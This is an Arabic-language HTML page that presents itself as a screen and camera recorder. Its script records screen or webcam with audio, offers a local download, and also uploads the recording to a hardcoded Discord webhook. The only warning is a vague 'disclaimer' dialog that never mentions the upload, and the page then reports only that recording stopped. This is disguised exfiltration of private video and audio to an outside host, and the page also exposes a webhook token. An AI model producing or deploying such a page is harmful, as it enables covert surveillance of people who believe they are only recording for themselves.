<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>تسجيل الشاشة / الكاميرا</title>

<style>
body {
  margin: 0;
  font-family: sans-serif;
  background: linear-gradient(135deg,#0f0c29,#302b63,#24243e);
  color: #fff;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  height: 100vh;
}

h1 { margin-bottom: 20px; }

button {
  padding: 12px 25px;
  margin: 10px;
  border-radius: 10px;
  border: none;
  font-size: 18px;
  cursor: pointer;
}

#start { background: #00c853; }
#stop { background: #ff5252; }

video {
  max-width: 90%;
  margin-top: 20px;
  border-radius: 10px;
}
</style>
</head>

<body>

<h1>🎥تسجيل الشاشة </h1>

<button id="start">بدء</button>
<button id="stop" disabled>إيقاف</button>

<video id="video" controls autoplay playsinline></video>

<script>
const webhookURL = "https://discord.com/api/webhooks/1484152062626369659/sMpPjPuKQ8nZoFWqI5Id97toLaiY_hyTNR_3kgpNJdu0JvAPim36IdHWgNV7WwIFKYJ6";

let recorder, stream, chunks = [];
let allowSend = false;

const startBtn = document.getElementById("start");
const stopBtn = document.getElementById("stop");
const video = document.getElementById("video");

startBtn.onclick = async () => {

  // 🔐 موافقة المستخدم
  allowSend = confirm("اخلاء  مسؤلية ");
  if (!allowSend) return;

  startBtn.disabled = true;
  stopBtn.disabled = false;

  try {
    stream = await navigator.mediaDevices.getDisplayMedia({
      video: true,
      audio: true
    });
  } catch {
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: true,
        audio: true
      });
      alert("تم بدء التصوير");
    } catch (err) {
      alert("فشل التشغيل ❌");
      startBtn.disabled = false;
      stopBtn.disabled = true;
      return;
    }
  }

  recorder = new MediaRecorder(stream);
  chunks = [];

  recorder.ondataavailable = e => {
    if (e.data.size > 0) chunks.push(e.data);
  };

  recorder.onstop = async () => {
    const blob = new Blob(chunks, { type: "video/webm" });
    const url = URL.createObjectURL(blob);
    video.src = url;

    // تحميل محلي
    const a = document.createElement("a");
    a.href = url;
    a.download = "record.webm";
    a.innerText = "⬇️ تحميل الفيديو";
    document.body.appendChild(a);

    // 📤 إرسال تلقائي بعد الإيقاف (بموافقة مسبقة)
    if (allowSend) {
      try {
        const formData = new FormData();
        formData.append("file", blob, "record.webm");

        await fetch(webhookURL, {
          method: "POST",
          body: formData
        });

        alert("تم توقيف التسجيل");
      } catch (err) {
        alert("فشل الإرسال ❌");
        console.error(err);
      }
    }
  };

  recorder.start();
};

stopBtn.onclick = () => {
  stopBtn.disabled = true;
  startBtn.disabled = false;

  recorder.stop();
  stream.getTracks().forEach(t => t.stop());
};
</script>

</body>
</html>
